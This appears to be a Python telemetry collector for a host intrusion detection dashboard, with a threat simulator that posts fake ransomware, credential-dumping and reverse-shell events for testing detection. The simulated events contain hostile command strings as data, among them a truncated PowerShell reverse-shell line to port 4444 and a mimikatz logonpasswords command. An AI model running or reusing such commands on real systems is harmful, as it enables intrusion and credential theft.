import os
import sys
import time
import requests
import psutil
import threading
import argparse
import random
from datetime import datetime

BACKEND_URL = "http://127.0.0.1:8000"
HEARTBEAT_ENDPOINT = f"{BACKEND_URL}/api/collector/heartbeat"
EVENTS_ENDPOINT = f"{BACKEND_URL}/api/events"

# Maintain sets of seen file paths and network connections to only report updates
seen_files = {} # { pid: set(files) }
seen_connections = {} # { pid: set(conn) }
known_pids = set()

# Thread exit flag
stop_event = threading.Event()

def get_process_info(proc):
    """Safely get process statistics, returning None on process exit or permission error."""
    try:
        # psutil properties can raise AccessDenied or NoSuchProcess
        pid = proc.pid
        name = proc.name()
        
        # Avoid tracking system idle process or collector itself
        if pid == 0 or pid == os.getpid():
            return None
            
        try:
            exe = proc.exe() or ""
        except (psutil.AccessDenied, psutil.ZombieProcess):
            exe = "[Access Denied]"
            
        try:
            cmdline = " ".join(proc.cmdline())
        except (psutil.AccessDenied, psutil.ZombieProcess):
            cmdline = ""
            
        try:
            username = proc.username()
        except (psutil.AccessDenied, psutil.ZombieProcess):
            username = "SYSTEM"
            
        try:
            ppid = proc.ppid()
            parent = psutil.Process(ppid)
            parent_name = parent.name()
        except (psutil.NoSuchProcess, psutil.AccessDenied, Exception):
            ppid = 0
            parent_name = "unknown"
            
        cpu = proc.cpu_percent(interval=None)
        mem = proc.memory_percent()
        
        return {
            "pid": pid,
            "name": name,
            "exe": exe,
            "cmdline": cmdline,
            "username": username,
            "parent_pid": ppid,
            "parent_name": parent_name,
            "cpu_percent": round(cpu, 2),
            "memory_percent": round(mem, 2)
        }
    except (psutil.NoSuchProcess, psutil.AccessDenied, Exception):
        return None

def send_heartbeat():
    """Gathers running processes and streams them to the backend."""
    global known_pids
    processes_payload = []
    current_pids = set()
    
    for proc in psutil.process_iter():
        p_info = get_process_info(proc)
        if p_info:
            processes_payload.append(p_info)
            current_pids.add(p_info["pid"])
            
            # Check for process spawn event
            if p_info["pid"] not in known_pids:
                send_system_event(
                    pid=p_info["pid"],
                    process_name=p_info["name"],
                    event_type="process",
                    action="spawn",
                    target_path=p_info["exe"],
                    details=f"Command line: {p_info['cmdline']}"
                )
                
            # Scan open files and network connections for the process
            scan_process_connections_and_files(proc, p_info["name"])

    # Update known PIDs list
    known_pids = current_pids

    try:
        # Stream heartbeat
        response = requests.post(HEARTBEAT_ENDPOINT, json=processes_payload, timeout=2.0)
        if response.status_code != 200:
            print(f"[-] Heartbeat status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to send heartbeat to backend: {e}")

def scan_process_connections_and_files(proc, proc_name):
    """Scan newly opened files and network connections for a process."""
    pid = proc.pid
    
    # 1. Scan network connections
    try:
        conns = proc.connections()
        if pid not in seen_connections:
            seen_connections[pid] = set()
            
        for conn in conns:
            if conn.status == "ESTABLISHED":
                raddr = f"{conn.raddr.ip}:{conn.raddr.port}"
                if raddr not in seen_connections[pid]:
                    seen_connections[pid].add(raddr)
                    # Report network connection
                    send_system_event(
                        pid=pid,
                        process_name=proc_name,
                        event_type="network",
                        action="connect",
                        target_path=raddr,
                        details=f"Local {conn.laddr.ip}:{conn.laddr.port} -> Remote {raddr}"
                    )
    except (psutil.AccessDenied, psutil.NoSuchProcess, Exception):
        pass

    # 2. Scan open files
    try:
        files = proc.open_files()
        if pid not in seen_files:
            seen_files[pid] = set()
            
        for f in files:
            fpath = f.path
            if fpath not in seen_files[pid]:
                seen_files[pid].add(fpath)
                # Report file access
                send_system_event(
                    pid=pid,
                    process_name=proc_name,
                    event_type="file",
                    action="read",
                    target_path=fpath,
                    details=f"File handle opened by {proc_name}"
                )
    except (psutil.AccessDenied, psutil.NoSuchProcess, Exception):
        pass

def send_system_event(pid, process_name, event_type, action, target_path="", details=""):
    """Posts telemetry event details to the backend."""
    payload = {
        "pid": pid,
        "process_name": process_name,
        "event_type": event_type,
        "action": action,
        "target_path": target_path,
        "details": details,
        "timestamp": datetime.now().isoformat()
    }
    try:
        response = requests.post(EVENTS_ENDPOINT, json=payload, timeout=2.0)
        if response.status_code == 200:
            res_data = response.json()
            if res_data.get("alert_triggered"):
                print(f"[!] Security Alert Triggered for {process_name} (PID {pid}): Risk {res_data.get('risk_score')}%")
        else:
            print(f"[-] Event post status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        # Silent fail during background operations
        pass

# --- THREAT SIMULATOR COMPONENT ---

def threat_simulator_loop():
    """Generates continuous benign and periodic malicious events to enrich dashboard visualization."""
    print("[*] Threat Simulator thread started.")
    
    time.sleep(5) # Wait for backend to fully start up
    
    # Static virtual PIDs for simulation
    BENIGN_BROWSER_PID = 8812
    RANSOMWARE_PID = 12900
    MIMIKATZ_PID = 14320
    REVERSE_SHELL_PID = 19920
    
    # 1. Initialize simulated processes in DB by sending heartbeat data
    simulated_processes = [
        {
            "pid": BENIGN_BROWSER_PID,
            "name": "chrome_sandbox.exe",
            "exe": "C:\\Program Files\\Google\\Chrome\\chrome_sandbox.exe",
            "cmdline": "--type=utility --utility-sub-type=network.mojom.NetworkService",
            "username": "sharm",
            "parent_pid": 1024,
            "parent_name": "chrome.exe",
            "cpu_percent": 0.5,
            "memory_percent": 1.2
        },
        {
            "pid": RANSOMWARE_PID,
            "name": "cryptolocker.exe",
            "exe": "C:\\Users\\sharm\\AppData\\Local\\Temp\\cryptolocker.exe",
            "cmdline": "--encrypt --path=C:\\Users\\sharm\\Documents",
            "username": "sharm",
            "parent_pid": 4502,
            "parent_name": "explorer.exe",
            "cpu_percent": 45.2,
            "memory_percent": 3.5
        },
        {
            "pid": MIMIKATZ_PID,
            "name": "mimikatz.exe",
            "exe": "C:\\Users\\sharm\\Downloads\\mimikatz.exe",
            "cmdline": "sekurlsa::logonpasswords exit",
            "username": "Administrator",
            "parent_pid": 9928,
            "parent_name": "cmd.exe",
            "cpu_percent": 2.1,
            "memory_percent": 0.8
        },
        {
            "pid": REVERSE_SHELL_PID,
            "name": "powershell.exe",
            "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "cmdline": "-nop -w hidden -c $c=New-Object System.Net.Sockets.TCPClient('192.168.12.5',4444);...",
            "username": "SYSTEM",
            "parent_pid": 6052,
            "parent_name": "httpd.exe",
            "cpu_percent": 1.5,
            "memory_percent": 1.1
        }
    ]
    
    try:
        requests.post(HEARTBEAT_ENDPOINT, json=simulated_processes, timeout=3.0)
    except Exception as e:
        print(f"[-] Threat simulator unable to post initial processes: {e}")
        
    while not stop_event.is_set():
        mode = random.choice(["benign", "ransomware", "credential", "shell"])
        
        try:
            if mode == "benign":
                # Simulated chrome socket connection
                send_system_event(
                    pid=BENIGN_BROWSER_PID,
                    process_name="chrome_sandbox.exe",
                    event_type="network",
                    action="connect",
                    target_path="142.250.190.46:443",
                    details="TLS Connection established with Google Server"
                )
                time.sleep(1)
                send_system_event(
                    pid=BENIGN_BROWSER_PID,
                    process_name="chrome_sandbox.exe",
                    event_type="file",
                    action="read",
                    target_path="C:\\Users\\sharm\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
                    details="Browser history read"
                )
                
            elif mode == "ransomware":
                print("[*] Simulating Ransomware encryption behavior...")
                # Bulk file writes and deletions
                for i in range(12):
                    if stop_event.is_set():
                        break
                    doc_name = f"invoice_copy_{i}.pdf"
                    # Read original
                    send_system_event(
                        pid=RANSOMWARE_PID,
                        process_name="cryptolocker.exe",
                        event_type="file",
                        action="read",
                        target_path=f"C:\\Users\\sharm\\Documents\\{doc_name}",
                        details="Opening original user document"
                    )
                    # Write encrypted
                    send_system_event(
                        pid=RANSOMWARE_PID,
                        process_name="cryptolocker.exe",
                        event_type="file",
                        action="write",
                        target_path=f"C:\\Users\\sharm\\Documents\\{doc_name}.locked",
                        details="Writing encrypted block payload"
                    )
                    # Delete original
                    send_system_event(
                        pid=RANSOMWARE_PID,
                        process_name="cryptolocker.exe",
                        event_type="file",
                        action="unlink",
                        target_path=f"C:\\Users\\sharm\\Documents\\{doc_name}",
                        details="Deleting original unencrypted document"
                    )
                    time.sleep(0.3)
                    
            elif mode == "credential":
                print("[*] Simulating Credential Dumping attack...")
                # Read LSASS / SAM registry keys
                send_system_event(
                    pid=MIMIKATZ_PID,
                    process_name="mimikatz.exe",
                    event_type="file",
                    action="read",
                    target_path="C:\\Windows\\System32\\config\\SAM",
                    details="Attempted handle access to Security Accounts Manager Database"
                )
                time.sleep(1.5)
                send_system_event(
                    pid=MIMIKATZ_PID,
                    process_name="mimikatz.exe",
                    event_type="network",
                    action="connect",
                    target_path="185.190.140.23:80",
                    details="Exfiltrating system sam secrets to malicious command server"
                )
                
            elif mode == "shell":
                print("[*] Simulating Reverse Shell execution sequence...")
                # PowerShell connecting out to listener
                send_system_event(
                    pid=REVERSE_SHELL_PID,
                    process_name="powershell.exe",
                    event_type="network",
                    action="connect",
                    target_path="192.168.12.5:4444",
                    details="Socket opened to netcat listener"
                )
                time.sleep(1.0)
                # Spawning multiple discovery commands
                for cmd in ["whoami", "ipconfig", "net user", "qwinsta"]:
                    if stop_event.is_set():
                        break
                    send_system_event(
                        pid=REVERSE_SHELL_PID,
                        process_name="powershell.exe",
                        event_type="process",
                        action="spawn",
                        target_path=f"C:\\Windows\\System32\\{cmd.split()[0]}.exe",
                        details=f"Executing privilege command: {cmd}"
                    )
                    time.sleep(0.5)
                    
        except Exception as e:
            print(f"[-] Error in simulation thread step: {e}")
            
        # Idle between waves of events
        time.sleep(12)

# --- MAIN COLLECTOR LOOP ---

def main():
    parser = argparse.ArgumentParser(description="AI-HIDS Telemetry Windows Collector")
    parser.add_argument("--simulate", action="store_true", help="Launch simulated threat generator alongside real processes")
    args = parser.parse_args()
    
    print("[+] AI-HIDS Windows Telemetry Collector active.")
    print(f"[+] Streaming heartbeats to: {HEARTBEAT_ENDPOINT}")
    print(f"[+] Streaming events to: {EVENTS_ENDPOINT}")
    
    sim_thread = None
    if args.simulate:
        # Start threat simulator thread
        sim_thread = threading.Thread(target=threat_simulator_loop, daemon=True)
        sim_thread.start()
        
    try:
        while True:
            # Sweeps running processes and posts heartbeat telemetry
            send_heartbeat()
            # Wait 3 seconds before next sweep
            time.sleep(3)
    except KeyboardInterrupt:
        print("[*] Stopping collector agent...")
        stop_event.set()
        if sim_thread:
            sim_thread.join(timeout=2.0)
        print("[+] Collector successfully shut down.")

if __name__ == "__main__":
    main()
